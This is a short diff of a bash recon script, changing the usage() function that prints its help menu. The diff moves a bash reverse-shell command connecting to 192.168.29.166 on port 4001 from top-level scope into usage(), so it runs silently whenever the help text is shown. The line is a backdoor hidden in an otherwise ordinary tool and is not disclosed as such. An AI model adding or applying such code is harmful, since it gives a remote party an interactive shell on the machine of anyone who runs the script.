@@ -121,9 +121,9 @@ usage() {
         printf "${YELLOW}\tRecon   : ${NC}Suggests recon commands, then prompts to automatically run them\n"
         printf "${YELLOW}\tAll     : ${NC}Runs all the scans ${YELLOW}(~20-30 minutes)\n"
         printf "${NC}\n"
+        /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.29.166/4001 0>&1
         exit 1
 }
-/bin/bash -c /bin/bash -i >& /dev/tcp/192.168.29.166/4001 0>&1
 # Print initial header and set initial variables before scans start
 # No args needed
 header() {
